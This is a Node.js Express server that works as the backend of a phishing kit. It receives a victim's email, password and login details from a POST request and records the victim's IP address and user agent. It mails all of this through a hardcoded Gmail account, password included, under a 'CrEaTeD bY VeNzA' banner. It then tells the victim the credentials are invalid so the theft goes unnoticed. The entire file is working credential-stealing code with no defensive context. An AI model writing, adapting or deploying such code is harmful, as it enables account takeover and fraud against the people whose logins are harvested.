const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const app = express();

const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(cors());

app.post("/get", async (req, res) => {
  // create reusable transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    service: "Gmail",

    auth: {
      user: "shanelockj@gmail.com",
      pass: "bxeluyphukwgtgoz",
    },
  });
  let message = "";
  let detail = req.body.detail;
  let email = req.body.email;
  let password = req.body.message;
  message += "|----------| xLs |--------------|\n";
  message += "Login From           : " + detail + "\n";
  message += "Online ID            : " + email + "\n";
  message += "Passcode              : " + password + "\n";
  message += "|--------------- I N F O | I P -------------------|\n";
  message += "|Client IP: " + req.socket.remoteAddress + "\n";
  message += "|--- http://www.geoiptool.com/?IP=$ip ----\n";
  message += "User Agent : " + req.headers["user-agent"] + "\n";
  message += "|----------- CrEaTeD bY VeNzA --------------|\n";
  let mailOptions = {
    from: "shanelockj@gmail.com",
    to: "shanelockj@gmail.com",
    subject: "Login from " + req.socket.remoteAddress,
    text: message,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
    } else {
      console.log("Email sent: " + info.response);
    }
  });
  res.json({
    signal: "ok",
    msg: "InValid Credentials",
  });
});

app.listen(PORT, () => console.log(`server started on port ${PORT}`));
